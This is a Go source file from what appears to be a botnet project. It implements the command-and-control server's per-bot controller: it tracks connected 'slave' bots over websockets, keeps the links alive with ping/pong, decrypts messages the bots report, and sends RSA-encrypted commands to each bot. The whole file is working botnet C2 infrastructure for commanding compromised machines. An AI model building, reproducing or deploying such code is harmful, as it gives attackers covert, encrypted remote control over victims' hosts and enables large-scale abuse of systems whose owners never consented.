package ccserver

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"time"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/websocket"

	uuid "github.com/satori/go.uuid"
)

const (
	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 1024                // Maximum message size allowed from peer
)

// BotCtrl holds the information the master needs from a connected slave
type BotCtrl struct {
	id          string
	slavePubKey *rsa.PublicKey
	WSConn      *websocket.Conn
	CommandChan chan *protocol.Command
	CC          *CommandAndControl
}

// NewBotCtrl is the constructor for a bot controller abstraction
func NewBotCtrl(cc *CommandAndControl, slavePubKey string, conn *websocket.Conn) (*BotCtrl, error) {
	pubKey, err := encryption.DecodePubKeyPEM([]byte(slavePubKey))
	if err != nil {
		return nil, fmt.Errorf("could not decode pub key: %s", err)
	}
	return &BotCtrl{
		id:          uuid.NewV4().String(),
		slavePubKey: pubKey,
		WSConn:      conn,
		CommandChan: make(chan *protocol.Command),
		CC:          cc,
	}, nil
}

func (b *BotCtrl) reader() {
	b.WSConn.SetReadLimit(maxMessageSize)
	b.WSConn.SetReadDeadline(time.Now().Add(pongWait))
	b.WSConn.SetPongHandler(func(string) error { b.WSConn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		// get the next message
		msgType, encryptedMessage, err := b.WSConn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}
		// discard all non binary type (non encrypted) messages
		if msgType != 2 {
			continue
		}
		// decrypt the JSON event and unmarshal onto the event type
		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, b.CC.msgDecryptKey)
		if err != nil {
			log.Printf("could not decrypt message from bot %s: %s", b.id, err)
			continue
		}
		var msg protocol.Message
		if err = json.Unmarshal(jsonMsg, &msg); err != nil {
			log.Printf("could not unmarshal message from bot %s: %s", b.id, err)
			continue
		}
		msg.BotID = b.id // attach bot ID to message
		b.CC.recvMsgChan <- &msg
	}
}

func (s *BotCtrl) writer() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		s.WSConn.Close()
	}()
	for {
		select {
		case cmd, ok := <-s.CommandChan:
			s.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				log.Println("we shouldnt get here though")
				s.WSConn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}
			cmdJSONBytes, err := json.Marshal(cmd)
			if err != nil {
				return
			}
			encryptedEvent, err := encryption.EncryptMessage(cmdJSONBytes, s.slavePubKey)
			if err != nil {
				return
			}
			s.WSConn.WriteMessage(2, encryptedEvent)
		case <-ticker.C:
			s.WSConn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := s.WSConn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}
